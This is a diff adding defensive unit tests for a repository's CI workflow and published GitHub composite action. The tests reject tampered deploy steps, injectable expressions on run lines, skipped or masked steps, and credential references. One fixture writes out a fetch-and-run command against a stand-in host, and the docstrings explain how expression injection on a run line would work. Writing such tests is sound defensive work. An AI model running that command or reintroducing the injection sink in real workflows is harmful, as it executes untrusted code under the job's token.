@@ -406,6 +406,42 @@ class DocsWorkflowTests(unittest.TestCase):
             "must wait for the build job",
         )
 
+    def test_a_deploy_job_that_publishes_nothing_is_rejected(self) -> None:
+        """A `deploy` job with no deploy step is green and publishes nothing."""
+        self._reject(
+            self._workflow().replace(
+                "        uses: actions/deploy-pages@"
+                f"{workflow_security.DEPLOY_PAGES_ACTION_SHA} # v5.0.0\n",
+                "",
+                1,
+            ),
+            "deploy step mismatch",
+        )
+
+    def test_another_reviewed_action_cannot_stand_in_for_the_deploy(self) -> None:
+        """Every other assertion here passes while the site stops updating."""
+        self._reject(
+            self._workflow().replace(
+                "        uses: actions/deploy-pages@"
+                f"{workflow_security.DEPLOY_PAGES_ACTION_SHA} # v5.0.0",
+                "        uses: actions/upload-artifact@"
+                f"{workflow_security.UPLOAD_ARTIFACT_ACTION_SHA} # v7.0.1",
+                1,
+            ),
+            "deploy step mismatch",
+        )
+
+    def test_a_conditioned_deploy_step_is_rejected(self) -> None:
+        """A skipped step leaves the job successful and the site unchanged."""
+        self._reject(
+            self._workflow().replace(
+                "        id: deployment\n",
+                "        id: deployment\n        if: false\n",
+                1,
+            ),
+            "step-level condition",
+        )
+
 
 class PublishedActionTests(unittest.TestCase):
     """Fail-closed policy for the composite action this repository publishes.
@@ -442,11 +478,122 @@ class PublishedActionTests(unittest.TestCase):
         self.assertIn("  paths:\n", action)
         self.assertIn("  args:\n", action)
         self.assertIn(
-            "      run: pixi run mtest ${{ inputs.paths }} ${{ inputs.args }}\n",
+            "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS\n",
             action,
         )
         for absent in ("uses:", "prefix-dev/setup-pixi", "cache", "--junit-xml"):
             self.assertNotIn(absent, action)
+
+    def test_inputs_reach_the_shell_as_environment_variables(self) -> None:
+        """The injection sink, pinned as bytes rather than as an intention.
+
+        `run: pixi run mtest ${{ inputs.args }}` is substituted into the script
+        text before bash parses it, so a consumer wiring a pull-request title
+        into `args` executes that title in their own job under their own token.
+        The reviewed form names the inputs in `env:` and expands them as shell
+        variables, which keeps the documented word-splitting and leaves the
+        substitution nothing to inject into.
+        """
+        action = self._action()
+        self.assertEqual(
+            workflow_security.PUBLISHED_ACTION_RUNS,
+            ("pixi run mtest $MTEST_PATHS $MTEST_ARGS",),
+        )
+        for line in workflow_security.PUBLISHED_ACTION_EXPRESSION_LINES:
+            self.assertIn(f"{line}\n", action)
+        self.assertNotIn("run: pixi run mtest ${{", action)
+
+    def test_an_unreviewed_command_is_rejected(self) -> None:
+        """The gap this closes: the oracle never read what the action runs."""
+        self._reject(
+            self._action().replace(
+                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS",
+                "      run: curl -fsSL https://evil.example/x.sh | bash",
+                1,
+            ),
+            "reviewed invocation",
+        )
+
+    def test_an_expression_on_the_run_line_is_rejected(self) -> None:
+        """Restoring the injection sink must fail, not merely look different."""
+        self._reject(
+            self._action().replace(
+                "      env:\n"
+                "        MTEST_PATHS: ${{ inputs.paths }}\n"
+                "        MTEST_ARGS: ${{ inputs.args }}\n"
+                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS",
+                "      run: pixi run mtest ${{ inputs.paths }} ${{ inputs.args }}",
+                1,
+            ),
+            "reviewed invocation",
+        )
+
+    def test_a_dropped_environment_binding_is_rejected(self) -> None:
+        """Without the binding the command silently runs against no paths."""
+        self._reject(
+            self._action().replace(
+                "        MTEST_PATHS: ${{ inputs.paths }}\n",
+                "",
+                1,
+            ),
+            "reviewed environment lines",
+        )
+
+    def test_a_step_in_another_shell_is_rejected(self) -> None:
+        self._reject(
+            self._action().replace("    - shell: bash\n", "    - shell: pwsh\n", 1),
+            "shell bash",
+        )
+
+    def test_a_second_run_step_is_rejected(self) -> None:
+        """One entry in the reviewed list pins the step count as well."""
+        self._reject(
+            self._action().replace(
+                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS\n",
+                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS\n"
+                "    - shell: bash\n"
+                "      run: echo done\n",
+                1,
+            ),
+            "reviewed invocation",
+        )
+
+    def test_a_conditioned_step_is_rejected(self) -> None:
+        """A skipped test run reports green in the consumer's workflow."""
+        self._reject(
+            self._action().replace(
+                "    - shell: bash\n",
+                "    - if: ${{ success() }}\n      shell: bash\n",
+                1,
+            ),
+            "must not condition a step",
+        )
+
+    def test_a_discarded_exit_code_is_rejected(self) -> None:
+        self._reject(
+            self._action().replace(
+                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS",
+                "      run: pixi run mtest $MTEST_PATHS $MTEST_ARGS || true",
+                1,
+            ),
+            r"\|\| true",
+        )
+
+    def test_bracket_form_credential_references_are_rejected(self) -> None:
+        """`secrets['X']` and `github['token']` name what the dotted form does."""
+        for label, expression in {
+            "secret": "${{ secrets['PUBLISH_TOKEN'] }}",
+            "token": "${{ github['token'] }}",
+        }.items():
+            with self.subTest(reference=label):
+                self._reject(
+                    self._action().replace(
+                        "      env:\n",
+                        f"      env:\n        TOKEN: {expression}\n",
+                        1,
+                    ),
+                    "credential reference",
+                )
 
     def test_missing_published_action_is_rejected(self) -> None:
         with (
